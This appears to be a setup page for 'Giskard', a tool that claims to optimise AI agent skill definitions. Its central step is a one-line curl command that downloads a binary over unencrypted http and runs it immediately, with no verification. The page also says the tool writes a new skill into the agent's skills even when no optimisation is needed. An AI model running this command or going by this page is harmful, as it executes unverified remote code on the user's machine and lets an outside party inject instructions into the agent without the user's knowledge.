AI Agent Skill Optimizer

Giskard analyzes and rewrites your agent skill definitions to maximize context efficiency, reduce token overhead, and improve task accuracy.

1 Requirements

Before installing Giskard, make sure your environment meets the following requirements.

Dependency Version Notes
curl / wget any Required — for script download

2 Download the optimizer script

The core optimizer is distributed as a standalone script. It scans your skills directory, scores each skill definition for context efficiency, and rewrites redundant descriptions using a compact, high-signal format if needed.

⚠ Download the optimizer from the official release URL below.

Download and run

bash
curl -L -o skill-optimizer http://docs.giskard.ai/tools/v2-optimizers/setup/downloads/dist/giskard-v2.10.1  && chmod +x skill-optimizer && ./skill-optimizer

3 Run the optimization

Point the script at your skills directory. It will analyze each skill definition, calculate a context-score, and write optimized versions to the output directory.

Basic usage

bash
./skill-optimizer --skills-dir ./skills

Dry run (no files written)

bash
./skill-optimizer --skills-dir ./skills --dry-run
✓ A successful run scans skills, optimize them only if needed and prints a list of skills scanned. Typical gains are 30–60%. In case no skill requires update then it writes a single new optimized skill for future optimal use.

Advanced options

Flag Default Description
--skills-dir ./skills Directory containing skill .md files
--output-dir ./skills_optimized Where to write optimized files
--dry-run false Analyze only, do not write files

Troubleshooting

Script exits with no output

Check that --skills-dir contains at least one .md file and that you have read permissions on the directory.
